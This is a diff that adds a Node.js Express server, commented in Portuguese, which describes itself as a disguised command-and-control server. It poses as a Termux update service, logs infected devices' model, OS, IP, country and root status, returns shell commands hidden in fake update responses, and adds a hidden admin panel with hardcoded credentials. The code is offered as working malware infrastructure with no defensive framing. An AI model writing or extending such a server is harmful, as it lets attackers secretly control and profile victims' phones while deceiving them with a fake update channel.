@@ -1,0 +1,96 @@
+// server.js - Servidor C2 disfarçado
+const express = require('express');
+const crypto = require('crypto');
+const mongoose = require('mongoose');
+const bodyParser = require('body-parser');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const app = express();
+
+// Configuração de Segurança
+app.use(helmet());
+app.use(bodyParser.json({ limit: '10kb' }));
+
+// Rate Limiting (parece legítimo)
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutos
+    max: 100 // limite por IP
+});
+app.use('/api/', limiter);
+
+// Conexão com MongoDB
+mongoose.connect('mongodb://localhost:27017/termux_stats', {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+});
+
+// Modelo de Dados disfarçado
+const Device = mongoose.model('Device', new mongoose.Schema({
+    deviceId: { type: String, index: true },
+    model: String,
+    osVersion: String,
+    lastSeen: { type: Date, default: Date.now },
+    ip: String,
+    country: String,
+    isRoot: Boolean,
+    commands: [String]
+}));
+
+// Rota "legítima" de atualização
+app.post('/v2/updates', async (req, res) => {
+    try {
+        const encryptedData = req.body;
+        const decrypted = decryptData(encryptedData); // Implementar AES
+        
+        const deviceData = JSON.parse(decrypted);
+        await Device.findOneAndUpdate(
+            { deviceId: deviceData.device_id },
+            { 
+                $set: {
+                    model: deviceData.model,
+                    osVersion: deviceData.os,
+                    lastSeen: new Date(),
+                    isRoot: deviceData.root === "true"
+                },
+                $push: { commands: { $each: [], $slice: -20 } }
+            },
+            { upsert: true, new: true }
+        );
+
+        // Resposta com comandos
+        res.json({
+            status: "success",
+            updates: [],
+            security_patches: [],
+            action: "cmd",
+            command: "getprop ro.product.model"
+        });
+
+    } catch (e) {
+        res.status(400).json({ status: "error", message: "Invalid request" });
+    }
+});
+
+// Painel Admin oculto
+app.get('/admin', (req, res) => {
+    // Autenticação básica
+    const auth = { login: "termux", password: "admin123" };
+    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
+    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');
+
+    if (login === auth.login && password === auth.password) {
+        return res.sendFile(__dirname + '/admin.html');
+    }
+    res.set('WWW-Authenticate', 'Basic realm="Termux Admin"');
+    return res.status(401).send('Authentication required');
+});
+
+// Inicia servidor
+app.listen(443, () => {
+    console.log('Termux Update Server running on port 443');
+});
+
+function decryptData(data) {
+    // Implementar decriptação AES
+    return "{}";
+}
